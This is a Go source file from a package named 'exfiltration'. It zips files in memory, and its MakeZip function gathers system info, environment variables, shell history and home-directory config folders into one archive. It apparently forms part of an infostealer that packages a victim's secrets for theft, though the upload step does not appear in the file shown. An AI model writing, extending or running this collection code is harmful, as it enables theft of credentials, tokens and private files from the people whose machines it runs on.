package exfiltration

import (
	"archive/zip"
	"bytes"
	"os"
	"io"
	"path/filepath"
)


func ZipInMemory(path string) ([]byte, error) {
	buf := new(bytes.Buffer)
	zipWriter := zip.NewWriter(buf)
	err := filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}
		relPath, err := filepath.Rel(path, filePath)
		if err != nil {
			return err
		}
		zipFile, err := zipWriter.Create(relPath)
		if err != nil {
			return err
		}
		file, err := os.Open(filePath)
		if err != nil {
			return err
		}
		defer file.Close()
		_, err = io.Copy(zipFile, file)
		return err
	})

	if err != nil {
		return nil, err
	}
	zipWriter.Close()
	return buf.Bytes(), nil
}

func AddFileToZip(zipWriter *zip.Writer, fileName string, fileData []byte) error {
	zipFile, err := zipWriter.Create(fileName)
	if err != nil {
		return err
	}

	var reader io.Reader
	reader = bytes.NewReader(fileData)
	_, err = io.Copy(zipFile, reader)
	return err
}


func CreateZip(files map[string][]byte) ([]byte, error) {
	var buf bytes.Buffer
	zipWriter := zip.NewWriter(&buf)

	for name, data := range files {
		if err := AddFileToZip(zipWriter, name, data); err != nil {
			return nil, err
		}
	}

	err := zipWriter.Close()
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}


func MakeZip() []byte{
	data, home, env, hist := GetInfo()
	dirs:=GetDirs(home)
	dirszip, _ := CreateZip(dirs)
	files := map[string][]byte{
		"info.txt":  data,
		"env.txt":   env,
		"historial.txt":  hist,
		"configs.zip": dirszip,
	}
	zipData, _ := CreateZip(files)
	return zipData
}